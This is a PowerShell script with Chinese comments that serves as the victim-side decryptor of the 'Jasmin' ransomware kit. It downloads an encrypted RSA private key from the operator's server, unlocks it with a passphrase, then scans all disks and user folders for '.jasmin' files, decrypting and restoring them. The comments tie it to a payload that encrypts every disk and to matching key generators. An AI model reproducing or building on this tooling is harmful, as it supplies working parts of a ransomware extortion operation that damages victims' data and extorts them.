# ════════════════════════════════════════════════════════════════
# Jasmin Windows 一键解密器 — 纯 PowerShell 实现，无需编译 exe
#   要求: PowerShell 7.0+ (.NET 5+)
#         Windows 10/11 可用 `winget install Microsoft.PowerShell`
#
# 用法:
#   pwsh -File jasmin_unlock.ps1 -Server http://1.2.3.4:8080 -K <口令> [-Paths 目录...]
#
# 说明:
#   - 私钥以 AES-128-CBC 加密传输（与 PHP/Python 两端 keygen 统一）
#   - 仅需 .NET 内置密码学库，不依赖 openssl / python / exe
#   - 不指定 -Paths 时默认解密【全部】加密文件：
#     扫描所有固定磁盘 + 常用用户目录下的每一个 .jasmin
# ════════════════════════════════════════════════════════════════
#Requires -Version 7.0

param(
    [Parameter(Mandatory=$true)][string]$Server,
    [Parameter(Mandatory=$true)][string]$K,
    [string[]]$Paths
)

$ErrorActionPreference = 'Stop'
$Server = $Server.TrimEnd('/')

if ($K.Length -ne 32) {
    Write-Host "[!] K 口令应为 32 个十六进制字符，当前长度 $($K.Length)" -ForegroundColor Red
    exit 1
}

if (-not $Paths -or $Paths.Count -eq 0) {
    # 未指定 => 解密全部加密文件（与载荷一致：载荷遍历所有磁盘）
    $Paths = @()
    # 所有固定磁盘
    foreach ($d in [System.IO.DriveInfo]::GetDrives()) {
        if ($d.IsReady -and ($d.DriveType -eq 'Fixed' -or $d.DriveType -eq 'Removable')) {
            $Paths += $d.RootDirectory.FullName
        }
    }
    # 常用用户目录（载荷优先命中这里）
    $Paths += @(
        "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Pictures",
        "$env:USERPROFILE\Videos", "$env:USERPROFILE\Music",
        "$env:USERPROFILE\OneDrive", "$env:PUBLIC"
    )
    $Paths = $Paths | Where-Object { $_ -and (Test-Path -LiteralPath $_) } | Select-Object -Unique
    Write-Host "[*] 未指定 -Paths — 将解密全部加密文件，扫描范围:"
    foreach ($x in $Paths) { Write-Host "      $x" }
}

$td = Join-Path $env:TEMP ("jasmin_" + [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Force -Path $td | Out-Null

try {
    # ── 1. 下载加密私钥 ──
    Write-Host "[*] 下载加密私钥..."
    Invoke-WebRequest -Uri "$Server/payloads/jasmin_private.pem.enc" -OutFile "$td/k.enc" -UseBasicParsing

    # ── 2. AES-128-CBC 解开私钥（key = K 的 16 字节 hex 解码） ──
    Write-Host "[*] 解密私钥 (AES-128-CBC)..."
    $raw = [Convert]::FromBase64String((Get-Content "$td/k.enc" -Raw))
    if ($raw.Length -le 16) { throw "密钥文件内容异常" }
    $iv = [byte[]]$raw[0..15]
    $ct = [byte[]]$raw[16..($raw.Length - 1)]

    $kb = [byte[]]::new(16)
    for ($i = 0; $i -lt 16; $i++) { $kb[$i] = [Convert]::ToByte($K.Substring($i * 2, 2), 16) }

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $kb; $aes.IV = $iv; $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'
    $dec = $aes.CreateDecryptor()
    $pem = $dec.TransformFinalBlock($ct, 0, $ct.Length)
    if ($pem.Length -lt 100) { throw "私钥解密失败（K 不正确？）" }

    $rsa = [System.Security.Cryptography.RSA]::Create()
    $rsa.ImportFromPem([System.Text.Encoding]::UTF8.GetString($pem))
    Write-Host "[+] 私钥已解开 (RSA-$($rsa.KeySize))"

    # ── 3. 遍历解密 ──
    Write-Host "[*] 开始解密文件..."
    $ok = 0; $fail = 0
    foreach ($p in $Paths) {
        if (-not (Test-Path -LiteralPath $p)) { Write-Host "[!] 路径不存在: $p" -ForegroundColor Yellow; continue }
        $files = Get-ChildItem -LiteralPath $p -Recurse -Filter '*.jasmin' -File -ErrorAction SilentlyContinue
        foreach ($item in $files) {
            $f = $item.FullName
            try {
                $b = [IO.File]::ReadAllBytes($f)
                if ($b.Length -lt 308) { throw "文件过小($($b.Length)B)，疑似损坏" }

                $ekLen = [BitConverter]::ToUInt32($b, $b.Length - 4)
                $ekOff = $b.Length - 4 - [int]$ekLen
                if ($ekOff -le 32 -or $ekLen -gt 512) { throw "RSA 密钥块长度异常($ekLen)" }

                $sha   = [byte[]]$b[0..31]
                $cblob = [byte[]]$b[32..($ekOff - 1)]
                $ek    = [byte[]]$b[$ekOff..($b.Length - 5)]

                $km  = $rsa.Decrypt($ek, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
                $key = [byte[]]$km[0..31]
                $aiv = [byte[]]$km[32..47]

                $a = [System.Security.Cryptography.Aes]::Create()
                $a.Key = $key; $a.IV = $aiv; $a.Mode = 'CBC'; $a.Padding = 'PKCS7'
                $dd = $a.CreateDecryptor()
                $plain = $dd.TransformFinalBlock($cblob, 0, $cblob.Length)

                $h = [System.Security.Cryptography.SHA256]::HashData($plain)
                if (-not [System.Linq.Enumerable]::SequenceEqual([byte[]]$h, $sha)) {
                    throw "SHA256 校验失败（文件可能被篡改或私钥不匹配）"
                }

                [IO.File]::WriteAllBytes(($f -replace '\.jasmin$', ''), $plain)
                Remove-Item -LiteralPath $f -Force
                Write-Host "[+] $f"
                $ok++
            }
            catch {
                Write-Host "[!] $f : $($_.Exception.Message)" -ForegroundColor Yellow
                $fail++
            }
        }
    }

    Write-Host ""
    Write-Host "=== 完成: $ok 个已解密, $fail 个失败 ==="
    if ($ok -eq 0 -and $fail -eq 0) {
        Write-Host "    未找到 .jasmin 文件。若文件在非常规位置，请用 -Paths 显式指定目录。" -ForegroundColor Yellow
    }
    exit ([int]($fail -gt 0))
}
finally {
    Remove-Item -Recurse -Force $td -ErrorAction SilentlyContinue
    Write-Host "[+] 临时文件已清理"
}
